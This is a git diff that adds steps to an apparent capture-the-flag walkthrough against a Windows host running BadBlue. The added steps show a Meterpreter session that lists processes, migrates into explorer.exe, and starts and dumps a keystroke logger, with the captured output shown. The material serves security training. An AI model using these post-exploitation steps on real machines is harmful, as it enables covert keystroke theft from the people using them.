@@ -106,3 +106,80 @@ type flag.txt
 70a569da306697d64fc6c19afea37d94
 C:\>
 ```
+#### 6. Exit from shell and show running process
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                           Path
+ ---   ----  ----                  ----  -------  ----                           ----
+ 0     0     [System Process]                                                    
+ 4     0     System                x64   0                                       
+ 368   4     smss.exe              x64   0                                       
+ 480   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
+ 532   524   csrss.exe             x64   0                                       
+ 536   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
+ 600   592   csrss.exe             x64   1                                       
+ 608   524   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wininit.exe
+ 636   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
+ 684   2376  csrss.exe             x64   3                                       
+ 696   608   services.exe          x64   0                                       
+ 704   608   lsass.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\lsass.exe
+ 764   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
+ 808   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
+ 884   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
+ 904   636   dwm.exe               x64   1        Window Manager\DWM-1           C:\Windows\System32\dwm.exe
+ 928   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
+ 940   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
+ 952   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
+ 1072  536   rdpclip.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\rdpclip.exe
+ 1108  2416  badblue.exe           x86   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files (x86)\BadBlue\EE\badblue.exe
+ 1112  696   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
+ 1140  696   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1184  696   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1208  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
+ 1268  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
+ 1356  696   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1596  2376  winlogon.exe          x64   3        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
+ 1732  1108  iexplore.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files\Internet Explorer\iexplore.exe
+ 1772  764   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\wbem\WmiPrvSE.exe
+ 2188  764   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wbem\WmiPrvSE.exe
+  2356  928   taskhostex.exe        x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\taskhostex.exe
+  2400  696   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\msdtc.exe
+  2416  2396  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
+  2468  1596  LogonUI.exe           x64   3        NT AUTHORITY\SYSTEM            C:\Windows\System32\LogonUI.exe
+  2740  1732  iexplore.exe          x86   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
+  2824  1596  dwm.exe               x64   3        Window Manager\DWM-3           C:\Windows\System32\dwm.exe
+```
+
+#### 7. Migrate to explorer.exe process on 2416
+
+```
+meterpreter > migrate 2416
+[*] Migrating from 1108 to 2416...
+[*] Migration completed successfully.
+```
+
+#### 8. Start keylogger
+
+```
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter >
+```
+
+#### 9. Dump keylogger
+
+```
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+<Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><CR>
+hallo hacker<CR>
+a<^H><Shift>### uucp
+
+meterpreter >
+
+```
